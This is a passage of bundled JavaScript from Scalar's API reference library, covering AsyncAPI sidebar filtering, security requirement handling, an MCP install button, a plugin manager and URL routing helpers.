	}, ...objectEntries(document.servers ?? {}).map(([name, serverNode]) => {
		const protocol = normalizeProtocol(getResolvedRef(serverNode)?.protocol);
		return {
			id: name,
			label: protocol ? `${name} (${protocol})` : name
		};
	})];
};
/** Precomputes the document-level data shared across every operation in a filter pass. */
var createReachabilityContext = (document) => ({
	serverProtocols: getServerProtocols(document),
	allServerNames: new Set(objectKeys(document.servers ?? {}))
});
/**
* Resolves the servers and protocols a single operation is reachable over.
*
* Resolves the operation's channel once, then intersects the channel's servers
* (or all servers, when the channel pins none) with the document's servers. The
* shared {@link AsyncApiReachabilityContext} is built once per filter pass; a fresh
* one is created when called standalone.
*/
var getOperationReachability = (document, operation, context = createReachabilityContext(document)) => {
	const channelServerNames = getChannelServerNames(document, resolveOperationChannel(document, operation)?.channel ?? null);
	const serverNames = channelServerNames ? new Set([...channelServerNames].filter((name) => context.allServerNames.has(name))) : new Set(context.allServerNames);
	const protocols = /* @__PURE__ */ new Set();
	for (const [name, protocol] of context.serverProtocols) if (serverNames.has(name)) protocols.add(protocol);
	return {
		serverNames,
		protocols
	};
};
//#endregion
//#region node_modules/@scalar/helpers/dist/object/is-object-equal.js
/**
* Compares two values with deep equality semantics.
*
* This utility is optimized for nested arrays and object-like values and uses
* `Object.is` for primitive and reference identity checks.
*/
var isObjectEqual = (a, b) => {
	if (Object.is(a, b)) return true;
	if (!isObjectLike(a) || !isObjectLike(b)) return false;
	if (Array.isArray(a)) {
		if (!Array.isArray(b) || a.length !== b.length) return false;
		for (let i = 0; i < a.length; i += 1) if (!isObjectEqual(a[i], b[i])) return false;
		return true;
	}
	if (Array.isArray(b)) return false;
	const leftObject = a;
	const rightObject = b;
	let leftCount = 0;
	for (const key in leftObject) {
		if (!Object.hasOwn(leftObject, key)) continue;
		leftCount += 1;
		if (!Object.hasOwn(rightObject, key) || !isObjectEqual(leftObject[key], rightObject[key])) return false;
	}
	let rightCount = 0;
	for (const key in rightObject) {
		if (!Object.hasOwn(rightObject, key)) continue;
		rightCount += 1;
	}
	return leftCount === rightCount;
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/dedupe-requirements.js
/**
* Remove duplicate security requirements, comparing by their JSON shape.
*
* Shared by the channel-connection and document-wide requirement builders, which both union
* requirements from several sources (servers, operations) and need to collapse identical entries.
*/
var dedupeRequirements = (requirements) => {
	const seen = /* @__PURE__ */ new Set();
	return requirements.filter((requirement) => {
		const key = JSON.stringify(requirement);
		if (seen.has(key)) return false;
		seen.add(key);
		return true;
	});
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/get-asyncapi-security-requirements.js
var getSecuritySchemeNameFromRef = (ref) => getNameFromRef(ref, ["components", "securitySchemes"]);
/** Strips requirement-only `scopes` so inline entries can match component scheme definitions. */
var getSecuritySchemeDefinition = (entry) => {
	const resolved = getResolvedRef(entry);
	if (resolved == null) return;
	if (!("scopes" in resolved)) return resolved;
	const { scopes: _scopes, ...scheme } = resolved;
	return scheme;
};
var getSecuritySchemeName = (document, entry) => {
	if ("$ref" in entry) {
		const nameFromRef = getSecuritySchemeNameFromRef(entry.$ref);
		if (nameFromRef) return nameFromRef;
	}
	const resolvedDefinition = getSecuritySchemeDefinition(entry);
	if (resolvedDefinition == null) return;
	const components = document.components ? getResolvedRef(document.components) : void 0;
	if (components?.securitySchemes) for (const [name, schemeRef] of Object.entries(components.securitySchemes)) {
		const scheme = getResolvedRef(schemeRef);
		if (scheme === resolvedDefinition || isObjectEqual(scheme, resolvedDefinition)) return name;
	}
};
var securityEntryToRequirement = (document, entry) => {
	const schemeName = getSecuritySchemeName(document, entry);
	if (!schemeName) return;
	const resolved = getResolvedRef(entry);
	const scopes = resolved != null && "scopes" in resolved && Array.isArray(resolved.scopes) ? [...resolved.scopes] : [];
	return { [schemeName]: scopes };
};
var collectSecurityRequirements = (document, security) => {
	if (!security?.length) return [];
	return security.map((entry) => securityEntryToRequirement(document, entry)).filter((requirement) => requirement != null);
};
/**
* Converts AsyncAPI security arrays (operation, traits, server) into OpenAPI-style requirement objects.
*/
var getAsyncApiSecurityRequirements = (document, operation, server) => {
	const operationRequirements = collectSecurityRequirements(document, operation?.security);
	const serverRequirements = collectSecurityRequirements(document, server?.security);
	return dedupeRequirements(operationRequirements.length === 0 ? serverRequirements : serverRequirements.length === 0 ? operationRequirements : [...operationRequirements, ...serverRequirements]);
};
/**
* Document-wide security requirements for an AsyncAPI document.
*
* AsyncAPI has no root-level `security`; the closest document-wide scope is the union of every
* server's security (a server applies to the whole connection). Operation-level security is
* intentionally excluded here — that is per-channel and handled separately.
*/
var getAsyncApiDocumentSecurityRequirements = (document) => {
	const servers = document.servers ? getResolvedRef(document.servers) : void 0;
	if (!servers) return [];
	const resolvedServers = Object.values(servers).map((serverRef) => getResolvedRef(serverRef));
	const perServerRequirements = resolvedServers.map((server) => getAsyncApiSecurityRequirements(document, null, server));
	const combined = perServerRequirements.flat();
	const someRequireAuth = perServerRequirements.some((requirements) => requirements.length > 0);
	const someDeclareNoAuth = resolvedServers.some((server) => !server?.security?.length);
	if (someRequireAuth && someDeclareNoAuth) combined.push({});
	return dedupeRequirements(combined);
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/resolve-operation-with-traits.js
var getTraitSecurity = (traits) => traits.reduce((security, traitRef) => {
	const trait = getResolvedRef(traitRef);
	return trait?.security !== void 0 ? trait.security : security;
}, void 0);
/**
* Merges operation traits into a single operation view, while keeping operation fields highest priority.
*/
var resolveOperationWithTraits = (operation) => {
	const traits = operation.traits ?? [];
	if (traits.length === 0) return operation;
	const traitSecurity = getTraitSecurity(traits);
	const traitBindings = traits.reduce((accumulated, traitRef) => {
		const trait = getResolvedRef(traitRef);
		if (!trait?.bindings) return accumulated;
		const resolvedTraitBindings = getResolvedRef(trait.bindings);
		return accumulated ? {
			...getResolvedRef(accumulated),
			...resolvedTraitBindings
		} : resolvedTraitBindings;
	}, void 0);
	const hasOperationSecurity = operation.security !== void 0;
	const security = operation.security ?? traitSecurity;
	const bindings = traitBindings && operation.bindings ? {
		...getResolvedRef(traitBindings),
		...getResolvedRef(operation.bindings)
	} : operation.bindings ?? traitBindings;
	return {
		...operation,
		...security !== void 0 || hasOperationSecurity ? { security } : {},
		...bindings !== operation.bindings ? { bindings } : {}
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-sidebar-filters-block/components/AsyncApiSidebarFilters.vue.js
var AsyncApiSidebarFilters_default = /* @__PURE__ */ defineComponent({
	__name: "AsyncApiSidebarFilters",
	props: /*@__PURE__*/ mergeModels({
		document: {},
		is: { default: "li" }
	}, {
		"protocol": { default: "" },
		"protocolModifiers": {},
		"server": { default: "" },
		"serverModifiers": {}
	}),
	emits: ["update:protocol", "update:server"],
	setup(__props) {
		/** Selected protocol id; empty string clears the filter. */
		const protocol = useModel(__props, "protocol");
		/** Selected server name; empty string clears the filter. */
		const server = useModel(__props, "server");
		/** Protocol picker options, including the leading "All protocols" entry. */
		const protocolOptions = computed(() => __props.document ? getAsyncApiProtocols(__props.document) : []);
		/** Server picker options, including the leading "All servers" entry. */
		const serverOptions = computed(() => __props.document ? getAsyncApiServerOptions(__props.document) : []);
		/** Each picker is only worth showing when there is a choice beyond "All …". */
		const showProtocol = computed(() => protocolOptions.value.length > 2);
		const showServer = computed(() => serverOptions.value.length > 2);
		return (_ctx, _cache) => {
			return showProtocol.value || showServer.value ? (openBlock(), createBlock(unref(ScalarSidebarSection_default), {
				key: 0,
				is: __props.is,
				class: "asyncapi-sidebar-filters"
			}, {
				items: withCtx(() => [showProtocol.value ? (openBlock(), createBlock(SidebarFilter_default, {
					key: 0,
					modelValue: protocol.value,
					"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => protocol.value = $event),
					label: "Protocol",
					options: protocolOptions.value
				}, null, 8, ["modelValue", "options"])) : createCommentVNode("", true), showServer.value ? (openBlock(), createBlock(SidebarFilter_default, {
					key: 1,
					modelValue: server.value,
					"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => server.value = $event),
					label: "Server",
					options: serverOptions.value
				}, null, 8, ["modelValue", "options"])) : createCommentVNode("", true)]),
				default: withCtx(() => [_cache[2] || (_cache[2] = createTextVNode(" Filters ", -1))]),
				_: 1
			}, 8, ["is"])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-sidebar-filters-block/helpers/filter-async-api-navigation.js
/** Whether the filter would keep every entry, so the tree can be returned untouched. */
var isNoopFilter = ({ protocol, server }) => (!protocol || protocol === "all") && (!server || server === "all");
/** Whether a selection (protocol or server) keeps an operation, given the set it is reachable through. */
var selectionMatches = (reachable, selected) => !selected || selected === "all" || reachable.has(selected);
/**
* Filters one navigation entry against the selected protocol/server.
*
* - `asyncapi-operation` — kept only when the operation matches both filters.
* - `asyncapi-channel` / `tag` — recursed into, then dropped when they have no
*   children left (so empty channels and tags disappear from the sidebar).
* - Everything else (description, models, schemas) passes through unchanged.
*
* `context` carries the document-level lookups so they are built once per filter
* pass rather than recomputed for every operation.
*
* Returns `null` when the entry should be removed.
*/
var filterEntry = (entry, document, filter, context) => {
	if (entry.type === "asyncapi-operation") {
		const operationNode = document.operations?.[entry.operationName];
		if (!operationNode) return entry;
		const { protocols, serverNames } = getOperationReachability(document, getResolvedRef(operationNode, mergeSiblingReferences), context);
		return selectionMatches(protocols, filter.protocol) && selectionMatches(serverNames, filter.server) ? entry : null;
	}
	if (entry.type === "asyncapi-channel" || entry.type === "tag") {
		const originalChildren = entry.children ?? [];
		const children = originalChildren.flatMap((child) => {
			const filtered = filterEntry(child, document, filter, context);
			return filtered ? [filtered] : [];
		});
		if (originalChildren.length > 0 && children.length === 0) return null;
		return {
			...entry,
			children
		};
	}
	return entry;
};
/**
* Filters the AsyncAPI sidebar tree by the selected protocol and/or server.
*
* Returns the original entries untouched when no filter is active, so OpenAPI
* documents and the unfiltered AsyncAPI case pay no cost.
*/
var filterAsyncApiNavigation = (entries, document, filter) => {
	if (isNoopFilter(filter)) return entries;
	const context = createReachabilityContext(document);
	return entries.flatMap((entry) => {
		const filtered = filterEntry(entry, document, filter, context);
		return filtered ? [filtered] : [];
	});
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/AgentScalar/AgentScalarButton.vue.js
var AgentScalarButton_default = /* @__PURE__ */ defineComponent({
	__name: "AgentScalarButton",
	setup(__props) {
		const agentContext = useAgentContext();
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", {
				class: "bg-sidebar-b-search text-sidebar-c-2 hover:text-sidebar-c-1 flex items-center gap-1.5 rounded border px-2 text-base whitespace-nowrap",
				type: "button",
				onClick: _cache[0] || (_cache[0] = ($event) => unref(agentContext)?.toggleAgent())
			}, [createVNode(unref(ScalarIconSparkle_default)), createTextVNode(" " + toDisplayString(unref(translate)("agent.askAi")), 1)]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/upload-temp-document.js
/** Type guard for the response body */
function isResponseBody(data) {
	return !!data && typeof data === "object" && "url" in data && typeof data.url === "string";
}
/** Upload a document and return a temporary URL */
async function uploadTempDocument(document, urls) {
	const body = JSON.stringify({ document });
	const uploadUrl = `${urls.apiBaseUrl}/core/share/upload/apis`;
	const response = await fetch(redirectToProxy(urls.proxyUrl, uploadUrl), {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body
	});
	if (!response.ok) throw new Error(` Failed to generate temporary link, server responded with ${response.status}`);
	const data = await response.json();
	if (!isResponseBody(data)) throw new Error("Failed to generate temporary link, invalid response from server");
	return data.url;
}
//#endregion
//#region node_modules/@scalar/helpers/dist/url/is-valid-url.js
/**
* Checks if a given string is a valid URL.
*
* @param {string} url - The string to be validated as a URL.
* @returns {boolean} Returns true if the string is a valid URL, false otherwise.
*
* @example
* isValidUrl('https://www.example.com'); // returns true
* isValidUrl('not a url'); // returns false
*/
function isValidUrl(url) {
	try {
		return Boolean(new URL(url));
	} catch {
		return false;
	}
}
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/AgentScalar/OpenMCPButton.vue.script.js
var _hoisted_1$99 = { class: "scalar-mcp-layer" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/AgentScalar/OpenMCPButton.vue.js
var OpenMCPButton_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "OpenMCPButton",
	props: /*@__PURE__*/ mergeModels({
		config: {},
		externalUrls: {},
		url: {},
		workspace: {}
	}, {
		"url": {},
		"urlModifiers": {}
	}),
	emits: ["update:url"],
	setup(__props) {
		const props = __props;
		const { copyToClipboard } = useClipboard();
		const { translate } = useLocalization();
		const { toast } = useToasts();
		const loader = useLoadingState();
		const hasConfig = props.config?.name || props.config?.url;
		const encoded = btoa(JSON.stringify(props.config ?? {}));
		const cursorLink = `cursor://anysphere.cursor-deeplink/mcp/install?name=${encodeURIComponent(props.config?.name ?? "")}&config=${encoded}`;
		const vscodeLink = `vscode:mcp/install?${encodeURIComponent(JSON.stringify(props.config ?? {}))}`;
		const docUrl = useModel(__props, "url");
		/** Generate and open the registration link */
		async function generateRegisterLink() {
			if (loader.isLoading || !props.workspace) return;
			if (docUrl.value && isValidUrl(docUrl.value)) {
				openRegisterLink(docUrl.value);
				return;
			}
			loader.start();
			const document = props.workspace.exportActiveDocument("json");
			if (!document) {
				toast(translate("developerTools.unableToExportDocument"), "error");
				await loader.invalidate();
				return;
			}
			try {
				docUrl.value = await uploadTempDocument(document, props.externalUrls);
				await loader.validate();
				openRegisterLink(docUrl.value);
				await nextTick();
				await loader.clear();
			} catch (error) {
				const message = error instanceof Error ? error.message : translate("developerTools.unknownError");
				toast(message, "error");
				await loader.invalidate();
			}
		}
		/** Open the registration link in a new tab */
		function openRegisterLink(documentUrl) {
			const url = new URL(`${props.externalUrls.dashboardUrl}/register`);
			url.searchParams.set("url", documentUrl);
			url.searchParams.set("createMcp", "true");
			window.open(url.toString(), "_blank");
		}
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$99, [
				(openBlock(), createBlock(resolveDynamicComponent(unref(hasConfig) ? "a" : "button"), {
					class: "scalar-mcp-layer-link",
					href: unref(hasConfig) ? vscodeLink : void 0,
					target: unref(hasConfig) ? "_blank" : void 0,
					type: unref(hasConfig) ? void 0 : "button",
					onClick: _cache[0] || (_cache[0] = (e) => {
						if (!unref(hasConfig)) {
							e.preventDefault();
							generateRegisterLink();
						}
					})
				}, {
					default: withCtx(() => [
						_cache[3] || (_cache[3] = createBaseVNode("svg", {
							class: "mcp-logo",
							fill: "currentColor",
							height: "800",
							viewBox: "0 0 32 32",
							width: "800",
							xmlns: "http://www.w3.org/2000/svg"
						}, [createBaseVNode("path", { d: "M30.865 3.448 24.282.281a1.99 1.99 0 0 0-2.276.385L9.397 12.171 3.902 8.004a1.33 1.33 0 0 0-1.703.073L.439 9.681a1.33 1.33 0 0 0-.005 1.969L5.2 15.999.434 20.348a1.33 1.33 0 0 0 .005 1.969l1.76 1.604a1.33 1.33 0 0 0 1.703.073l5.495-4.172 12.615 11.51a1.98 1.98 0 0 0 2.271.385l6.589-3.172a1.99 1.99 0 0 0 1.13-1.802V5.248c0-.766-.443-1.469-1.135-1.802zm-6.86 19.818L14.432 16l9.573-7.266z" })], -1)),
						_cache[4] || (_cache[4] = createTextVNode(" VS Code ", -1)),
						createVNode(unref(ScalarIconArrowUpRight_default), { class: "mcp-nav ml-auto size-4" })
					]),
					_: 1
				}, 8, [
					"href",
					"target",
					"type"
				])),
				(openBlock(), createBlock(resolveDynamicComponent(unref(hasConfig) ? "a" : "button"), {
					class: "scalar-mcp-layer-link",
					href: unref(hasConfig) ? cursorLink : void 0,
					target: unref(hasConfig) ? "_blank" : void 0,
					type: unref(hasConfig) ? void 0 : "button",
					onClick: _cache[1] || (_cache[1] = (e) => {
						if (!unref(hasConfig)) {
							e.preventDefault();
							generateRegisterLink();
						}
					})
				}, {
					default: withCtx(() => [
						_cache[5] || (_cache[5] = createBaseVNode("svg", {
							class: "mcp-logo",
							viewBox: "0 0 466.73 532.09",
							xmlns: "http://www.w3.org/2000/svg"
						}, [createBaseVNode("path", {
							d: "M457.43 125.94 244.42 2.96a22.13 22.13 0 0 0-22.12 0L9.3 125.94C3.55 129.26 0 135.4 0 142.05v247.99c0 6.65 3.55 12.79 9.3 16.11l213.01 122.98a22.13 22.13 0 0 0 22.12 0l213.01-122.98c5.75-3.32 9.3-9.46 9.3-16.11V142.05c0-6.65-3.55-12.79-9.3-16.11zm-13.38 26.05L238.42 508.15c-1.39 2.4-5.06 1.42-5.06-1.36V273.58c0-4.66-2.49-8.97-6.53-11.31L24.87 145.67c-2.4-1.39-1.42-5.06 1.36-5.06h411.26c5.84 0 9.49 6.33 6.57 11.39h-.01Z",
							style: { "fill": "currentColor" }
						})], -1)),
						_cache[6] || (_cache[6] = createTextVNode(" Cursor ", -1)),
						createVNode(unref(ScalarIconArrowUpRight_default), { class: "mcp-nav ml-auto size-4" })
					]),
					_: 1
				}, 8, [
					"href",
					"target",
					"type"
				])),
				!unref(hasConfig) ? (openBlock(), createElementBlock("div", {
					key: 0,
					class: "scalar-mcp-layer-link",
					onClick: generateRegisterLink
				}, [
					_cache[7] || (_cache[7] = createBaseVNode("svg", {
						class: "mcp-logo",
						fill: "none",
						height: "173",
						viewBox: "0 0 156 173",
						width: "156",
						xmlns: "http://www.w3.org/2000/svg"
					}, [
						createBaseVNode("path", {
							d: "m6 80.912 67.882-67.883c9.373-9.372 24.569-9.372 33.941 0s9.373 24.569 0 33.942L56.558 98.236",
							stroke: "currentColor",
							"stroke-linecap": "round",
							"stroke-width": "12"
						}),
						createBaseVNode("path", {
							d: "m57.265 97.529 50.558-50.558c9.373-9.373 24.569-9.373 33.942 0l.353.353c9.373 9.373 9.373 24.569 0 33.941L80.725 142.66a8 8 0 0 0 0 11.313l12.606 12.607",
							stroke: "currentColor",
							"stroke-linecap": "round",
							"stroke-width": "12"
						}),
						createBaseVNode("path", {
							d: "M90.853 30 40.648 80.205c-9.372 9.372-9.372 24.568 0 33.941 9.373 9.372 24.569 9.372 33.941 0l50.205-50.205",
							stroke: "currentColor",
							"stroke-linecap": "round",
							"stroke-width": "12"
						})
					], -1)),
					createTextVNode(" " + toDisplayString(unref(translate)("mcp.generate")) + " ", 1),
					createVNode(unref(ScalarIconArrowUpRight_default), { class: "mcp-nav ml-auto size-4" })
				])) : (openBlock(), createElementBlock("div", {
					key: 1,
					class: "scalar-mcp-layer-link",
					onClick: _cache[2] || (_cache[2] = ($event) => unref(copyToClipboard)(__props.config?.url ?? ""))
				}, [createTextVNode(toDisplayString(unref(translate)("mcp.connect")) + " ", 1), _cache[8] || (_cache[8] = createBaseVNode("svg", {
					class: "mcp-logo ml-auto",
					fill: "none",
					height: "173",
					viewBox: "0 0 156 173",
					width: "156",
					xmlns: "http://www.w3.org/2000/svg"
				}, [
					createBaseVNode("path", {
						d: "m6 80.912 67.882-67.883c9.373-9.372 24.569-9.372 33.941 0s9.373 24.569 0 33.942L56.558 98.236",
						stroke: "currentColor",
						"stroke-linecap": "round",
						"stroke-width": "12"
					}),
					createBaseVNode("path", {
						d: "m57.265 97.529 50.558-50.558c9.373-9.373 24.569-9.373 33.942 0l.353.353c9.373 9.373 9.373 24.569 0 33.941L80.725 142.66a8 8 0 0 0 0 11.313l12.606 12.607",
						stroke: "currentColor",
						"stroke-linecap": "round",
						"stroke-width": "12"
					}),
					createBaseVNode("path", {
						d: "M90.853 30 40.648 80.205c-9.372 9.372-9.372 24.568 0 33.941 9.373 9.372 24.569 9.372 33.941 0l50.205-50.205",
						stroke: "currentColor",
						"stroke-linecap": "round",
						"stroke-width": "12"
					})
				], -1))]))
			]);
		};
	}
}), [["__scopeId", "data-v-24b70070"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/ClassicHeader.vue.js
var _sfc_main$7 = {};
var _hoisted_1$98 = { class: "references-classic-header-container" };
var _hoisted_2$61 = { class: "references-classic-header" };
var _hoisted_3$43 = { class: "references-classic-header-content" };
function _sfc_render$8(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$98, [createBaseVNode("div", _hoisted_2$61, [createBaseVNode("div", _hoisted_3$43, [renderSlot(_ctx.$slots, "default", {}, void 0, true)]), renderSlot(_ctx.$slots, "dark-mode-toggle", {}, void 0, true)])]);
}
var ClassicHeader_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$7, [["render", _sfc_render$8], ["__scopeId", "data-v-8a3822ca"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/hooks/use-intersection.js
/**
* Shrinks the observation root to a thin horizontal strip at the vertical middle of
* the viewport (~2% of viewport height). Emits only while the target overlaps that line.
*/
var VIEWPORT_VERTICAL_CENTER_ROOT_MARGIN = "-49% 0px -49% 0px";
var useIntersection = (el, onIntersect, options) => {
	onMounted(() => {
		const observerOptions = {
			rootMargin: options?.immediate ? "0px 0px 0px 0px" : VIEWPORT_VERTICAL_CENTER_ROOT_MARGIN,
			threshold: 0
		};
		if (el.value) useIntersectionObserver(el, ([entry]) => {
			if (entry?.isIntersecting) onIntersect();
			else options?.onExit?.();
		}, observerOptions);
	});
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/plugins/plugin-manager.js
/**
* A no-op auth state used when no accessor is provided (e.g. in tests or a standalone manager).
* It reports an empty authentication state so plugins can call the read methods unconditionally.
*/
var createEmptyAuthState = () => ({
	export: () => ({}),
	getAuthSecrets: () => void 0,
	getAuthSelectedSchemas: () => void 0
});
/** Plugin view slots that can render custom components in the content area */
var PLUGIN_VIEW_NAMES = ["content.start", "content.end"];
/**
* Build a stable, unique id for a plugin view component.
*
* The same id is used as the DOM element id (so scroll navigation can find it) and as the
* sidebar navigation entry id (so clicking it scrolls to the element). Keeping both in sync
* is what lets plugin views participate in the existing scroll-spy and navigation logic.
*
* The id is prefixed with the document slug so it matches the navigation id convention. That is
* what lets URL deep-linking work: `getIdFromUrl` re-prepends the document slug on initial load,
* so a hash like `plugin-view/<plugin>/<view>/<index>` resolves back to this exact id.
*/
var getPluginViewId = (documentSlug, pluginName, viewName, index) => `${documentSlug}/plugin-view/${pluginName}/${viewName}/${index}`;
/**
* Create the plugin manager store
*
* This store manages all plugins registered with the API client
*/
var createPluginManager = ({ plugins = [], auth }) => {
	const registeredPlugins = /* @__PURE__ */ new Map();
	const authState = auth ?? createEmptyAuthState();
	plugins.forEach((plugin) => {
		const pluginInstance = plugin();
		registeredPlugins.set(pluginInstance.name, pluginInstance);
	});
	return {
		/**
		* Get all extensions with the given name from registered plugins
		*/
		getSpecificationExtensions: (name) => {
			const extensions = [];
			for (const plugin of registeredPlugins.values()) for (const extension of plugin.extensions) if (extension.name === name) extensions.push(extension);
			return extensions;
		},
		/**
		* Get all components for a specific view from registered plugins.
		*
		* Each component carries a stable `id` (scoped to the active document slug) so the rendered
		* DOM element and the sidebar entry (see `getSidebarEntries`) share the same id and stay in
		* sync for scroll navigation and deep-linking.
		*/
		getViewComponents: (viewName, documentSlug) => {
			const components = [];
			for (const plugin of registeredPlugins.values()) {
				const viewComponents = plugin.views?.[viewName];
				if (viewComponents) viewComponents.forEach((component, index) => {
					components.push({
						...component,
						id: getPluginViewId(documentSlug, plugin.name, viewName, index)
					});
				});
			}
			return components;
		},
		/**
		* Notify all plugins that the API Reference has been initialized
		*/
		notifyInit: (config) => {
			for (const plugin of registeredPlugins.values()) plugin.hooks?.onInit?.({
				config,
				auth: authState
			});
		},
		/**
		* Notify all plugins that the configuration has changed
		*/
		notifyConfigChange: (config) => {
			for (const plugin of registeredPlugins.values()) plugin.hooks?.onConfigChange?.({
				config,
				auth: authState
			});
		},
		/**
		* Get the read-only accessor for the global authentication state.
		*
		* Plugin view components can call this (via `usePluginManager`) to read stored secrets and the
		* selected security schemes. Returns an empty auth state when no accessor was provided.
		*/
		getAuthState: () => authState,
		/**
		* Notify all plugins that the API Reference is being destroyed
		*/
		notifyDestroy: () => {
			for (const plugin of registeredPlugins.values()) plugin.hooks?.onDestroy?.();
		},
		/**
		* Get all client plugins provided by registered plugins
		*/
		getApiClientPlugins: () => {
			const apiClientPlugins = [];
			for (const plugin of registeredPlugins.values()) if (plugin.apiClientPlugins) apiClientPlugins.push(...plugin.apiClientPlugins);
			return apiClientPlugins;
		},
		/**
		* Get all sidebar entries contributed by plugin views.
		*
		* Only views that opt in via `sidebar.show` are returned. Each entry's `id` matches the
		* id of the rendered component (see `getViewComponents`), so the API Reference can add it
		* to the sidebar navigation and scrolling/active-tracking work out of the box.
		*/
		getSidebarEntries: (documentSlug) => {
			const entries = [];
			for (const plugin of registeredPlugins.values()) for (const viewName of PLUGIN_VIEW_NAMES) (plugin.views?.[viewName])?.forEach((component, index) => {
				if (component.sidebar?.show && component.sidebar.label) entries.push({
					id: getPluginViewId(documentSlug, plugin.name, viewName, index),
					label: component.sidebar.label,
					viewName
				});
			});
			return entries;
		}
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/plugins/hooks/usePluginManager.js
var PLUGIN_MANAGER_SYMBOL = Symbol();
/**
* Hook to access the plugin manager
*/
var usePluginManager = () => {
	const manager = inject(PLUGIN_MANAGER_SYMBOL);
	if (!manager) return createPluginManager({});
	return manager;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/storage.js
var storage = safeLocalStorage();
/**
* Provides an interface to store and retrieve the selected client value
* in local storage.
*/
var clientStorage = () => {
	const key = REFERENCE_LS_KEYS.SELECTED_CLIENT;
	return {
		/**
		* Gets the stored selected client from local storage.
		*/
		get: () => {
			return storage.getItem(key);
		},
		/**
		* Stores the selected client value in local storage.
		* @param value The value to store
		*/
		set: (value) => {
			storage.setItem(key, value);
		}
	};
};
/**
* Provides an interface to store and retrieve authentication scheme
* information in local storage, including both the available schemes and
* the user's selected schemes.
*/
var authStorage = () => {
	const getKey = (slug) => {
		return `${REFERENCE_LS_KEYS.AUTH}-${slug}`;
	};
	return {
		/**
		* Retrieves and coerces the authentication schemes stored in local storage.
		*/
		getAuth: (slug) => {
			return coerceValue(AuthSchema, JSON.parse(storage.getItem(getKey(slug)) ?? "{}"));
		},
		/**
		* Stores the authentication schemes in local storage.
		* @param value The Auth object to stringify and store.
		*/
		setAuth: (slug, value) => {
			storage.setItem(getKey(slug), JSON.stringify(value));
		}
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/plugins/persistence-plugin.js
/**
* Plugin to persist workspace state changes with debounced writes.
*/
var persistencePlugin = ({ debounceDelay = 500, maxWait = 1e4, persistAuth = false }) => {
	const { execute } = debounce({
		delay: debounceDelay,
		maxWait
	});
	const authPersistence = authStorage();
	const clientPersistence = clientStorage();
	const getPersistAuth = () => {
		if (typeof persistAuth === "function") return persistAuth();
		return persistAuth;
	};
	return { hooks: { 
	/**
	* Handles all workspace state change events.
	* Each write is debounced by a key to prevent frequent writes for the same entity.
	*/
onWorkspaceStateChanges(event) {
		if (event.type === "meta") {
			const defaultClient = event.value["x-scalar-default-client"];
			if (defaultClient !== void 0) execute("x-scalar-default-client", () => clientPersistence.set(defaultClient));
			return;
		}
		if (getPersistAuth() && event.type === "auth") execute(`auth-${event.documentName}`, () => authPersistence.setAuth(event.documentName, event.value));
	} } };
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/id-routing.js
/**
* Strips leading slashes.
*
* Scanned by hand rather than with a regex: an unanchored `\/+` alternative
* is retried at every index, so a base path made of many slashes costs
* quadratic time. The base path comes from consumer configuration, which
* makes it reachable from the exported helpers below.
*/
var trimLeadingSlashes = (value) => {
	let start = 0;
	while (start < value.length && value[start] === "/") start += 1;
	return value.slice(start);
};
/** Strips trailing slashes, linear for the same reason as {@link trimLeadingSlashes} */
var trimTrailingSlashes = (value) => {
	let end = value.length;
	while (end > 0 && value[end - 1] === "/") end -= 1;
	return value.slice(0, end);
};
var sanitizeBasePath = (basePath) => {
	return trimTrailingSlashes(trimLeadingSlashes(basePath));
};
var isHashBasePath = (basePath) => basePath.startsWith("#");
var sanitizeHashBasePath = (basePath) => {
	return trimTrailingSlashes(basePath.replace(/^#+/, ""));
};
var applySlugPrefix = (base, slugPrefix) => {
	return slugPrefix ? `${slugPrefix}${base ? "/" : ""}${base}` : base;
};
var stripBasePathPrefix = (value, basePath) => {
	if (value === basePath) return "";
	if (value.startsWith(`${basePath}/`)) return value.slice(basePath.length + 1);
	return null;
};
/**
* Builds the URL-encoded, slash-prefixed form of a sanitized base path.
*
* Each segment is encoded separately so the result matches how the browser stores
* `location.pathname` (which encodes within segments but leaves the slashes between them).
*/
var encodeBasePath = (sanitized) => {
	if (!sanitized) return "";
	return `/${sanitized.split("/").map((segment) => encodeURIComponent(segment)).join("/")}`;
};
/** Extracts an element id from the hash when using hash routing */
var getIdFromHash = (location, slugPrefix) => {
	const url = typeof location === "string" ? new URL(location) : location;
	return applySlugPrefix(decodeURIComponent(url.hash.slice(1)), slugPrefix);
};
/** Extracts an element id from the path when using path routing */
var getIdFromPath = (location, basePath, slugPrefix) => {
	const url = typeof location === "string" ? new URL(location) : location;
	const basePathWithSlash = encodeBasePath(sanitizeBasePath(basePath));
	if (url.pathname.startsWith(basePathWithSlash)) {
		const remainder = url.pathname.slice(basePathWithSlash.length);
		return applySlugPrefix(decodeURIComponent(remainder.startsWith("/") ? remainder.slice(1) : remainder), slugPrefix);
	}
	return slugPrefix ?? "";
};
/** Extracts an element id from a hash-prefixed basePath */
var getIdFromHashBasePath = (location, basePath, slugPrefix) => {
	const url = typeof location === "string" ? new URL(location) : location;
